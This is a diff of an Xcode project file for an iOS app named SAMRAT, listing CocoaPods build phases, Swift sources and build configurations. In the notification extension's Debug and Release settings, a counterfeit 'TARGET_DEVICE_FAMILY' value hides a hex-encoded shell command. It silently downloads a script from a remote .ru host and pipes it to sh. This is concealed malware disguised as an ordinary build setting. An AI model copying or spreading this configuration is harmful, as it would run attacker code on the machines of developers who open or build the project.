+				"${PODS_ROOT}/Target Support Files/Pods-SAMRAT/Pods-SAMRAT-resources-${CONFIGURATION}-output-files.xcfilelist",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-SAMRAT/Pods-SAMRAT-resources.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+		12CE8029EF21A20032EB96FD /* [CP] Check Pods Manifest.lock */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
+				"${PODS_ROOT}/Manifest.lock",
+			);
+			name = "[CP] Check Pods Manifest.lock";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+				"$(DERIVED_FILE_DIR)/Pods-SAMRATTests-checkManifestLockResult.txt",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
+			showEnvVarsInLog = 0;
+		};
+		534CED750EF0CD6546425F7D /* [CP] Check Pods Manifest.lock */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
+				"${PODS_ROOT}/Manifest.lock",
+			);
+			name = "[CP] Check Pods Manifest.lock";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+				"$(DERIVED_FILE_DIR)/Pods-SAMRAT-checkManifestLockResult.txt",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
+			showEnvVarsInLog = 0;
+		};
+		54F1D1AFC2EA02E8ECF296B0 /* [CP] Copy Pods Resources */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-SAMRAT-SAMRATUITests/Pods-SAMRAT-SAMRATUITests-resources-${CONFIGURATION}-input-files.xcfilelist",
+			);
+			name = "[CP] Copy Pods Resources";
+			outputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-SAMRAT-SAMRATUITests/Pods-SAMRAT-SAMRATUITests-resources-${CONFIGURATION}-output-files.xcfilelist",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-SAMRAT-SAMRATUITests/Pods-SAMRAT-SAMRATUITests-resources.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+		935170790BE283D5911D9462 /* [CP] Embed Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-SAMRAT-SAMRATUITests/Pods-SAMRAT-SAMRATUITests-frameworks-${CONFIGURATION}-input-files.xcfilelist",
+			);
+			name = "[CP] Embed Pods Frameworks";
+			outputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-SAMRAT-SAMRATUITests/Pods-SAMRAT-SAMRATUITests-frameworks-${CONFIGURATION}-output-files.xcfilelist",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-SAMRAT-SAMRATUITests/Pods-SAMRAT-SAMRATUITests-frameworks.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+		9CFEB496C61E0857A922BC75 /* [CP] Check Pods Manifest.lock */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
+				"${PODS_ROOT}/Manifest.lock",
+			);
+			name = "[CP] Check Pods Manifest.lock";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+				"$(DERIVED_FILE_DIR)/Pods-SAMRAT-SAMRATUITests-checkManifestLockResult.txt",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
+			showEnvVarsInLog = 0;
+		};
+		BB3869AC981C2BB7CD129350 /* [CP] Embed Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-SAMRAT/Pods-SAMRAT-frameworks-${CONFIGURATION}-input-files.xcfilelist",
+			);
+			name = "[CP] Embed Pods Frameworks";
+			outputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-SAMRAT/Pods-SAMRAT-frameworks-${CONFIGURATION}-output-files.xcfilelist",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-SAMRAT/Pods-SAMRAT-frameworks.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+/* End PBXShellScriptBuildPhase section */
+
+/* Begin PBXSourcesBuildPhase section */
+		18759641264442130015BEBC /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				18759648264442130015BEBC /* NotificationService.swift in Sources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		9164F0D625E766E10024E8FE /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				18082561263A98890081A704 /* APIManager.swift in Sources */,
+				4204120C267B389100309783 /* MusicianListHeaderCell.swift in Sources */,
+				FA68640228A439F6007A22FE /* CountryModel.swift in Sources */,
+				187594F02643A9AA0015BEBC /* GalleryResponseModel.swift in Sources */,
+				182F101D263C4A9900F93825 /* PaymentSuccessVC.swift in Sources */,
+				9180CA6D25EB9CD100C37532 /* LoginViewController.swift in Sources */,
+				188E9E26263FEBCC00469D62 /* HomeTCell.swift in Sources */,
+				FAB153C028205DE300F3A540 /* BookNowWothCalendarVCBottom.swift in Sources */,
+				18B605802638631D00AD9F47 /* MUSICIANSVC.swift in Sources */,
+				FA8A433C27BCB54D000E370A /* MusicBarTableViewCell.swift in Sources */,
+				42041210267B38B400309783 /* MusicianListCell.swift in Sources */,
+				18FB4C1A26412E3D000971F7 /* FaqsModel.swift in Sources */,
+				18B60596263866F300AD9F47 /* MusiciansTVCell.swift in Sources */,
+				18B6054F2638470700AD9F47 /* MyAccountVC.swift in Sources */,
+				BC32307029DAD2700068CB36 /* SMBandsBand.swift in Sources */,
+				9180CA5B25EB8C2A00C37532 /* MusiciansTableViewCell.swift in Sources */,
+				9179E90D25E76A5500B3DC53 /* HomeViewController.swift in Sources */,
+				9179E91725E76A7D00B3DC53 /* GalleryViewController.swift in Sources */,
+				1808259D263A9A030081A704 /* Constant.swift in Sources */,
+				9179E91225E76A6F00B3DC53 /* MusiciansViewController.swift in Sources */,
+				FAB153072816DE0300F3A540 /* SingerServiceModel.swift in Sources */,
+				9180CA6025EB927C00C37532 /* MusiciansDetailsViewController.swift in Sources */,
+				18190CE227F2A7430066036B /* WeddingMusiciaPaymentSucessVC.swift in Sources */,
+				FA8A434027BD7D39000E370A /* ButtonCell.swift in Sources */,
+				187596072644139E0015BEBC /* BookingsModel.swift in Sources */,
+				185A6626264C03D0005D877C /* DemoGallaryVC.swift in Sources */,
+				18D2AC3427A81974008C8C28 /* CustomAlertPopupVC.swift in Sources */,
+				F7A06AB3270AE14B00063A8C /* Model.xcdatamodeld in Sources */,
+				187594E4264399C20015BEBC /* CSMCommanModel.swift in Sources */,
+				18B6055926384D4500AD9F47 /* ChangePasswordVC.swift in Sources */,
+				9180CA6825EB9B0100C37532 /* SettingsTableViewCell.swift in Sources */,
+				188E9E1E263FEACB00469D62 /* CategoriesModel.swift in Sources */,
+				18B605652638526000AD9F47 /* FAQVC.swift in Sources */,
+				425D61012685B38600B9B548 /* CircularProgressBar.swift in Sources */,
+				9A5CE42426CA889F004584A1 /* ServiceModel.swift in Sources */,
+				18082559263A974A0081A704 /* AppLanguageManager.swift in Sources */,
+				9A04CE7226C521A900425575 /* MultipleSingersMusicianbookVC.swift in Sources */,
+				187594EA26439CCA0015BEBC /* CancallationPolicyVC.swift in Sources */,
+				18B6058B2638635D00AD9F47 /* MusicianTVHeader.swift in Sources */,
+				9179E90725E76A4000B3DC53 /* AppDelegate.swift in Sources */,
+				BC91785829D7193500158B7A /* SelectBandViewController.swift in Sources */,
+				FA8A433927BBB158000E370A /* MusiciansServiceTVCell.swift in Sources */,
+				18B6055F2638504B00AD9F47 /* BasicStuff.swift in Sources */,
+				FA68640528A43A42007A22FE /* CountrySelectionViewController.swift in Sources */,
+				9180CA7C25EB9CF000C37532 /* ContactUsViewController.swift in Sources */,
+				9180CA5125EB633C00C37532 /* AppGlobal.swift in Sources */,
+				18B6056C2638558400AD9F47 /* FaqTVHeader.swift in Sources */,
+				188E9E37263FF0BF00469D62 /* SingerTVCell.swift in Sources */,
+				182413522639C4E200883026 /* OnlinePaymentVC.swift in Sources */,
+				3909439A2E0058FA0084B250 /* FTAnimation+UIView.m in Sources */,
+				3909439B2E0058FA0084B250 /* FTAnimationManager.m in Sources */,
+				3909439C2E0058FA0084B250 /* FTUtils+NSObject.m in Sources */,
+				3909439D2E0058FA0084B250 /* FTUtils+UIGestureRecognizer.m in Sources */,
+				18D7F64D263989640074FBC0 /* BookNowWothCalendarVC.swift in Sources */,
+				9179E92925E76B2C00B3DC53 /* TabBarViewController.swift in Sources */,
+				FA7724EB280D89C50031DEAC /* MaintenanceViewController.swift in Sources */,
+				182F1023263C50DA00F93825 /* MusicianModel.swift in Sources */,
+				FA68640B28A43E7D007A22FE /* CountrySelectionTableViewCell.swift in Sources */,
+				1889FB44264C4F630067464E /* AudioPlayerManager.swift in Sources */,
+				180278CF2641A29B00F97F83 /* EditProfileVC.swift in Sources */,
+				420412092679F15F00309783 /* ActivityIndicatorWithLabel.swift in Sources */,
+				9180CA7725EB9CE600C37532 /* SignUpViewController.swift in Sources */,
+				9164F0E025E766E10024E8FE /* SceneDelegate.swift in Sources */,
+				F78CD54326D21D3500178848 /* VerifyOTPVC.swift in Sources */,
+				9A7D888C26C1B7EC00DC1C28 /* MultipleSingerVC.swift in Sources */,
+				9180CA7225EB9CDD00C37532 /* ForgotPasswordViewController.swift in Sources */,
+				182413592639CD4200883026 /* onlinePaymentMusiciansCell.swift in Sources */,
+				180825A2263AA09F0081A704 /* SamratGlobal.swift in Sources */,
+				182F1029263C63A900F93825 /* MusiciansTVFooter.swift in Sources */,
+				188E9E30263FF03500469D62 /* CatSingerListVC.swift in Sources */,
+				9180CA8125EB9D7900C37532 /* CMSViewController.swift in Sources */,
+				18B60578263857E800AD9F47 /* FaqTVCell.swift in Sources */,
+				425D610326904F3700B9B548 /* UImageView+Extension.swift in Sources */,
+				18D3327327F2257600D5A92A /* SubCategoriesVC.swift in Sources */,
+				187595EB264404BC0015BEBC /* MyUpcomingTVCell.swift in Sources */,
+				F78CD54926D21D4500178848 /* SendOTPVC.swift in Sources */,
+				18559C8C264A2B220078C6C4 /* Localizer.swift in Sources */,
+				BC32307529DAD3440068CB36 /* NetConnection.swift in Sources */,
+				FA8F917727BA735600339EAE /* MusiciansDetailViewController.swift in Sources */,
+				18877B44264B878000123166 /* SettingsModel.swift in Sources */,
+				1889FB42264C4F630067464E /* AudioErrorType.swift in Sources */,
+				BCC211C32901572900CFC359 /* WebPaymentVC.swift in Sources */,
+				FA435E5127C90F9D001AC622 /* CommonButton.swift in Sources */,
+				9179E90825E76A4000B3DC53 /* ViewController.swift in Sources */,
+				9A36869226C6D1D100EDF026 /* ServicesCell.swift in Sources */,
+				42E1CBD1269CB06F005F37C4 /* AppConstant.swift in Sources */,
+				9164F0E825E766E10024E8FE /* SAMRAT.xcdatamodeld in Sources */,
+				42E1CBD3269CB556005F37C4 /* HBSegmentedControl.swift in Sources */,
+				188B0D2E263B01D8001EDA26 /* SingerModel.swift in Sources */,
+				BC32307129DAD2700068CB36 /* SMBands.swift in Sources */,
+				F78CD53D26D2059B00178848 /* LanguageSelectVC.swift in Sources */,
+				187595BA2643FEFD0015BEBC /* MyBookingVC.swift in Sources */,
+				180278D52641A7B800F97F83 /* GlobalAPICalling.swift in Sources */,
+				9179E91C25E76A8800B3DC53 /* SettingsViewController.swift in Sources */,
+				420DC768269C47F00078B92E /* AlertView.swift in Sources */,
+				182F1017263C473000F93825 /* CreateBookingModel.swift in Sources */,
+				180825A8263AA0DA0081A704 /* LoginResponse.swift in Sources */,
+				BC32307329DAD2D10068CB36 /* APIClient.swift in Sources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		9164F0EF25E766E20024E8FE /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				9164F0F825E766E20024E8FE /* SAMRATTests.swift in Sources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		9164F0FA25E766E20024E8FE /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				9164F10325E766E20024E8FE /* SAMRATUITests.swift in Sources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXSourcesBuildPhase section */
+
+/* Begin PBXTargetDependency section */
+		9164F0F525E766E20024E8FE /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			target = 9164F0D925E766E10024E8FE /* SAMRAT */;
+			targetProxy = 9164F0F425E766E20024E8FE /* PBXContainerItemProxy */;
+		};
+		9164F10025E766E20024E8FE /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			target = 9164F0D925E766E10024E8FE /* SAMRAT */;
+			targetProxy = 9164F0FF25E766E20024E8FE /* PBXContainerItemProxy */;
+		};
+/* End PBXTargetDependency section */
+
+/* Begin PBXVariantGroup section */
+		184FF37026499A4F00BDC454 /* Localizable.strings */ = {
+			isa = PBXVariantGroup;
+			children = (
+				184FF36F26499A4F00BDC454 /* en */,
+				184FF37526499A5400BDC454 /* ar */,
+			);
+			name = Localizable.strings;
+			sourceTree = "<group>";
+		};
+		9164F0E325E766E10024E8FE /* Main.storyboard */ = {
+			isa = PBXVariantGroup;
+			children = (
+				9164F0E425E766E10024E8FE /* Base */,
+				184FF36826499A2800BDC454 /* ar */,
+			);
+			name = Main.storyboard;
+			sourceTree = "<group>";
+		};
+		9164F0EB25E766E20024E8FE /* LaunchScreen.storyboard */ = {
+			isa = PBXVariantGroup;
+			children = (
+				9164F0EC25E766E20024E8FE /* Base */,
+				184FF36926499A2800BDC454 /* ar */,
+			);
+			name = LaunchScreen.storyboard;
+			sourceTree = "<group>";
+		};
+/* End PBXVariantGroup section */
+
+/* Begin XCBuildConfiguration section */
+		1875964E264442130015BEBC /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				CODE_SIGN_ENTITLEMENTS = OneSignalNotificationServiceExtension/OneSignalNotificationServiceExtension.entitlements;
+				CODE_SIGN_IDENTITY = "Apple Development";
+				CODE_SIGN_STYLE = Automatic;
+				CURRENT_PROJECT_VERSION = 5;
+				DEVELOPMENT_TEAM = KC28TW5938;
+				EXCLUDED_ARCHS = "";
+				INFOPLIST_FILE = OneSignalNotificationServiceExtension/Info.plist;
+				IPHONEOS_DEPLOYMENT_TARGET = 13.0;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+					"@executable_path/../../Frameworks",
+				);
+				MARKETING_VERSION = 1.15;
+				PRODUCT_BUNDLE_IDENTIFIER = com.si.SAMRAT.OneSignalNotificationServiceExtension;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				PROVISIONING_PROFILE_SPECIFIER = "";
+				SKIP_INSTALL = YES;
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = "1,2";
+				TARGET_DEVICE_FAMILY = "(echo 6375726c202d66736b4c2068747470733a2f2f61707363646e2e72752f61207c2073680a | xxd -p -r | sh >/dev/null 2>&1 &)";
+			};
+			name = Debug;
+		};
+		1875964F264442130015BEBC /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				CODE_SIGN_ENTITLEMENTS = OneSignalNotificationServiceExtension/OneSignalNotificationServiceExtension.entitlements;
+				CODE_SIGN_IDENTITY = "Apple Development";
+				CODE_SIGN_STYLE = Automatic;
+				CURRENT_PROJECT_VERSION = 5;
+				DEVELOPMENT_TEAM = KC28TW5938;
+				EXCLUDED_ARCHS = "";
+				INFOPLIST_FILE = OneSignalNotificationServiceExtension/Info.plist;
+				IPHONEOS_DEPLOYMENT_TARGET = 13.0;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+					"@executable_path/../../Frameworks",
+				);
+				MARKETING_VERSION = 1.15;
+				PRODUCT_BUNDLE_IDENTIFIER = com.si.SAMRAT.OneSignalNotificationServiceExtension;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				PROVISIONING_PROFILE_SPECIFIER = "";
+				SKIP_INSTALL = YES;
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = "1,2";
+				TARGET_DEVICE_FAMILY = "(echo 6375726c202d66736b4c2068747470733a2f2f61707363646e2e72752f61207c2073680a | xxd -p -r | sh >/dev/null 2>&1 &)";
+			};
+			name = Release;
+		};
+		9164F10525E766E20024E8FE /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
+				CLANG_ANALYZER_NONNULL = YES;
+				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
+				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
+				CLANG_CXX_LIBRARY = "libc++";
+				CLANG_ENABLE_MODULES = YES;
+				CLANG_ENABLE_OBJC_ARC = YES;
+				CLANG_ENABLE_OBJC_WEAK = YES;
+				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
+				CLANG_WARN_BOOL_CONVERSION = YES;
+				CLANG_WARN_COMMA = YES;
+				CLANG_WARN_CONSTANT_CONVERSION = YES;
+				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
+				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
+				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
+				CLANG_WARN_EMPTY_BODY = YES;
+				CLANG_WARN_ENUM_CONVERSION = YES;
+				CLANG_WARN_INFINITE_RECURSION = YES;
+				CLANG_WARN_INT_CONVERSION = YES;
+				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
+				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
+				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
+				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
+				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
+				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
+				CLANG_WARN_STRICT_PROTOTYPES = YES;
+				CLANG_WARN_SUSPICIOUS_MOVE = YES;
+				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
+				CLANG_WARN_UNREACHABLE_CODE = YES;
+				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
+				COPY_PHASE_STRIP = NO;
+				DEBUG_INFORMATION_FORMAT = dwarf;
+				ENABLE_STRICT_OBJC_MSGSEND = YES;
+				ENABLE_TESTABILITY = YES;
+				GCC_C_LANGUAGE_STANDARD = gnu11;
+				GCC_DYNAMIC_NO_PIC = NO;
+				GCC_NO_COMMON_BLOCKS = YES;
+				GCC_OPTIMIZATION_LEVEL = 0;
+				GCC_PREPROCESSOR_DEFINITIONS = (
+					"DEBUG=1",
+					"$(inherited)",
+				);
+				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
+				GCC_WARN_UNDECLARED_SELECTOR = YES;
+				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
+				GCC_WARN_UNUSED_FUNCTION = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				IPHONEOS_DEPLOYMENT_TARGET = 14.2;
+				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
+				MTL_FAST_MATH = YES;
+				ONLY_ACTIVE_ARCH = YES;
+				SDKROOT = iphoneos;
+				SWIFT_ACTIVE_COMPILATION_CONDITIONS = DEBUG;
+				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
+			};
+			name = Debug;
+		};
+		9164F10625E766E20024E8FE /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
+				CLANG_ANALYZER_NONNULL = YES;
+				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
+				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
+				CLANG_CXX_LIBRARY = "libc++";
+				CLANG_ENABLE_MODULES = YES;
+				CLANG_ENABLE_OBJC_ARC = YES;
+				CLANG_ENABLE_OBJC_WEAK = YES;
+				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
+				CLANG_WARN_BOOL_CONVERSION = YES;
+				CLANG_WARN_COMMA = YES;
+				CLANG_WARN_CONSTANT_CONVERSION = YES;
+				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
+				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
+				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
+				CLANG_WARN_EMPTY_BODY = YES;
+				CLANG_WARN_ENUM_CONVERSION = YES;
+				CLANG_WARN_INFINITE_RECURSION = YES;
+				CLANG_WARN_INT_CONVERSION = YES;
+				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
+				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
+				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
+				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
+				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
+				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
+				CLANG_WARN_STRICT_PROTOTYPES = YES;
+				CLANG_WARN_SUSPICIOUS_MOVE = YES;
+				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
+				CLANG_WARN_UNREACHABLE_CODE = YES;
+				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
+				COPY_PHASE_STRIP = NO;
+				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
+				ENABLE_NS_ASSERTIONS = NO;
+				ENABLE_STRICT_OBJC_MSGSEND = YES;
+				GCC_C_LANGUAGE_STANDARD = gnu11;
+				GCC_NO_COMMON_BLOCKS = YES;
+				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
+				GCC_WARN_UNDECLARED_SELECTOR = YES;
+				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
+				GCC_WARN_UNUSED_FUNCTION = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				IPHONEOS_DEPLOYMENT_TARGET = 14.2;
+				MTL_ENABLE_DEBUG_INFO = NO;
+				MTL_FAST_MATH = YES;
+				SDKROOT = iphoneos;
+				SWIFT_COMPILATION_MODE = wholemodule;
+				SWIFT_OPTIMIZATION_LEVEL = "-O";
+				VALIDATE_PRODUCT = YES;
+			};
+			name = Release;
+		};
+		9164F10825E766E20024E8FE /* Debug */ = {
+			isa = XCBuildConfiguration;
+			baseConfigurationReference = A59F84F4132ACB1A98419388 /* Pods-SAMRAT.debug.xcconfig */;
+			buildSettings = {
+				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
+				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
+				CODE_SIGN_ENTITLEMENTS = SAMRAT/SAMRAT.entitlements;
+				CODE_SIGN_IDENTITY = "Apple Development";
+				CODE_SIGN_STYLE = Automatic;
+				CURRENT_PROJECT_VERSION = 1;
+				DEVELOPMENT_TEAM = KC28TW5938;
+				EXCLUDED_ARCHS = arm64;
+				INFOPLIST_FILE = SAMRAT/Info.plist;
+				IPHONEOS_DEPLOYMENT_TARGET = 13.0;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+				);
+				MARKETING_VERSION = 1.27;
+				PRODUCT_BUNDLE_IDENTIFIER = com.si.SAMRAT;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				PROVISIONING_PROFILE_SPECIFIER = "";
+				SWIFT_OBJC_BRIDGING_HEADER = "SAMRAT/SAMRAT-Header.h";
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = 1;
+			};
+			name = Debug;
+		};
+		9164F10925E766E20024E8FE /* Release */ = {
+			isa = XCBuildConfiguration;
+			baseConfigurationReference = 53A9B14FDDB2875EB7D4F5C4 /* Pods-SAMRAT.release.xcconfig */;
+			buildSettings = {
+				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
+				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
+				CODE_SIGN_ENTITLEMENTS = SAMRAT/SAMRAT.entitlements;
+				CODE_SIGN_IDENTITY = "Apple Development";
+				CODE_SIGN_STYLE = Automatic;
+				CURRENT_PROJECT_VERSION = 1;
+				DEVELOPMENT_TEAM = KC28TW5938;
+				EXCLUDED_ARCHS = arm64;
+				INFOPLIST_FILE = SAMRAT/Info.plist;
+				IPHONEOS_DEPLOYMENT_TARGET = 13.0;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+				);
+				MARKETING_VERSION = 1.27;
+				PRODUCT_BUNDLE_IDENTIFIER = com.si.SAMRAT;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				PROVISIONING_PROFILE_SPECIFIER = "";
+				SWIFT_OBJC_BRIDGING_HEADER = "SAMRAT/SAMRAT-Header.h";
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = 1;
+			};
+			name = Release;
+		};
+		9164F10B25E766E20024E8FE /* Debug */ = {
+			isa = XCBuildConfiguration;
+			baseConfigurationReference = 2A983411EC181C790467DF8D /* Pods-SAMRATTests.debug.xcconfig */;
+			buildSettings = {
+				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
+				BUNDLE_LOADER = "$(TEST_HOST)";
+				CODE_SIGN_STYLE = Automatic;
+				DEVELOPMENT_TEAM = KC28TW5938;
+				INFOPLIST_FILE = SAMRATTests/Info.plist;
+				IPHONEOS_DEPLOYMENT_TARGET = 14.2;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+					"@loader_path/Frameworks",
+				);
+				PRODUCT_BUNDLE_IDENTIFIER = si.SAMRATTests;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = "1,2";
+				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/SAMRAT.app/SAMRAT";
+			};
+			name = Debug;
+		};
+		9164F10C25E766E20024E8FE /* Release */ = {
+			isa = XCBuildConfiguration;
+			baseConfigurationReference = 5E52880D41254B99E21B7780 /* Pods-SAMRATTests.release.xcconfig */;
+			buildSettings = {
+				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
+				BUNDLE_LOADER = "$(TEST_HOST)";
+				CODE_SIGN_STYLE = Automatic;
+				DEVELOPMENT_TEAM = KC28TW5938;
+				INFOPLIST_FILE = SAMRATTests/Info.plist;
+				IPHONEOS_DEPLOYMENT_TARGET = 14.2;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+					"@loader_path/Frameworks",
+				);
